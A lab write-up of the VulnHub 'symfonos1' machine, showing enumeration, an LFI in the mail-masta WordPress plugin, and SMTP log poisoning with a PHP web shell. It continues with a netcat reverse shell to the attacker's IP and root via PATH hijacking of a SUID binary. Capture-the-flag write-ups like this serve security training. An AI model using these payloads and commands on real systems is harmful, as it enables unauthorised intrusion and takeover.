---
title: "symfonos1"
date: 2020-06-27
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for the symfonos 1 VM"
os: "Linux"
platform: "VulnHub"
tags: [vulnhub, symfonos, symfonos1, Boot2Root]
comments: false
---

Another series I ran across on vulnhub is the symfonos series, which is a total of 6 boxes of increasing difficulty. Below is the walkthrough on the first box, the easiest in the series.

## Reconnaissance & Scanning

After importing into VMware Workstation and booting up the machine, I ran `netdiscover -i eth0` to find the IP address of the machine.

![symfonos1 netdiscover](/images/symfonos1-1.png)

Now that we have located the IP address of our target, we can proceed with performing an **nmap** scan to search for open ports, protocols and their versions.

![symfonos1 nmap](/images/symfonos1-2.png)

Based on the scan, we can see that ssh, smtp, netbios and smb are running, along with an Apache webserver on port 80. Visiting the webpage brings us to a page with nothing special on it, just a background image.

![symfonos1 home page](/images/symfonos1-3.png)

At this point, I elected to run **dirb** to enumerate the website. It came back with minimal results using the big.txt wordlist, as it just had a list of Apache's manual directories.

![symfonos1 dirb](/images/symfonos1-4.png)

I next turned my attention to SMB that was running over port 445. I was able to connect as an anonymous user using **rpcclient** as shown below.

![symfonos1 rpcclient](/images/symfonos1-5.png)

Running `enumdomusers` results in a user, helios, being uncovered. Running `queryuser 0x3e8` displays info about that user. `getdompwinfo` displays that the minimum characters for the password are set to 5. However before attempting to brute force the password, I wanted to enumerate the smb shares based on the result of the **nmap** scan.

![symfonos1 rpcclient info](/images/symfonos1-6.png)

Next, I ran the smb-enum-shares script with nmap to enumerate smb shares.

![symfonos1 rpcclient nmap smb-enum-shares](/images/symfonos1-7.png)

This showed several different shares that could be connected to anonymously **\\192.168.68.137\anonymous, \\192.168.68.137\IPC$,** and **\\192.168.68.137\print$**. There was also a **\\192.168.68.137\helios** share present that anonymous/guest access was disabled on.

At this point, I tried to connect to the shares anonymous could access to see if anything could be pilfered. This was done with **smbclient**. The anonymous share was the first to be checked. Upon connecting, there was an attention.txt file present.

![symfonos1 smbclient anonymous share](/images/symfonos1-8.png)

I downloaded the file, dropped the smb connection, and read the file locally with **cat**.

![symfonos1 smbclient attention.txt](/images/symfonos1-9.png)

This file lists 3 potential passwords, and we already uncovered the **helios** user earlier while running rpcclient. Let's try to connect to his share via SMB with these passwords.

![symfonos1 smbclient helios share](/images/symfonos1-10.png)

Success, we were able to connect with the password of **qwerty** as helios to his directory. As shown above, there were two files in that directory we saved with **get**.

![symfonos1 research.txt todo.txt](/images/symfonos1-11.png)

The **research.txt** file had info about Helios, but nothing relevant to enumerating further. The second file mentions a /h3l105 folder. Let's see what happens when we append this to the end of the website url.

![symfonos1 research.txt h3l105](/images/symfonos1-12.png)

It appears that this is a wordpress site, but it is not loading completely because it's trying to access symfonos.local, lets add that to our attacking machine's host file and reload the page. This is done by running `nano /etc/hosts` and adding it as shown in the screenshot below:

![symfonos1 etc/hosts](/images/symfonos1-13.png)

Once saved, reload the page again. You should now see the page properly and a login page. Next, we will use wp-scan to enumerate plugins for possible vulnerabilities.

![symfonos1 wp-scan enumerate plugins](/images/symfonos1-14.png)

## Exploitation

You will come across mail-masta as one of the plugins in use. A quick Google search leads to an exploit for this on [Exploit-DB](https://www.exploit-db.com/exploits/40290).

![symfonos1 LFI exploit](/images/symfonos1-15.png)

Modify the sample code and use the following url to pull a list of users on the system `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`.

![symfonos1 LFI etc/passwd](/images/symfonos1-16.png)

Now that we are sure that LFI works, we can attempt SMTP poisoning to utilize RCE. This is accomplished with running `telnet symfonos.local 25`.

![symfonos1 smtp](/images/symfonos1-17.png)

We will now send an email to Helios with a 1 line of PHP code that allows for RCE: `<?php system($_GET['c']); ?>`.

![symfonos1 smtp send](/images/symfonos1-18.png)

Navigating to `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=pwd` will print the working directory after the output of helios' mail.

![symfonos1 smtp RCE](/images/symfonos1-19.png)

This means we should be able to create a reverse shell, lets create a netcat listener on our attacking machine with `nc -nvlp 5555` and then navigate to `symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc -e /bin/sh 192.168.68.135 5555` in the web browser and press enter, this should connect to your netcat listener.

![symfonos1 website RCE](/images/symfonos1-20.png)
![symfonos1 netcat connection](/images/symfonos1-21.png)

Next, we will create a TTY shell with `python -c 'import pty;pty.spawn("/bin/bash")'`.

![symfonos1 python tty shell](/images/symfonos1-22.png)

Then, we will use the following `find / -perm -u=s -type f 2>/dev/null` to find all the programs that run with SUID.

![symfonos1 find](/images/symfonos1-23.png)

One that stands out is **/opt/statuscheck** which has a **curl** command embedded in it when reviewing the binary with `strings /opt/statuscheck`.

![symfonos1 statuscheck](/images/symfonos1-24.png)

We will take advantage of this by copying the bash shell into a curl binary in the temp directory and temporarily changing the $PATH variable to run this command instead of curl as shown below.

![symfonos1 root shell](/images/symfonos1-25.png)

At this point you have root! Navigate to /root and run ls to list files, you should see **proof.txt**. Run `cat proof.txt` to view the contents of this file to finish the box.

![symfonos1 root proof.txt](/images/symfonos1-26.png)










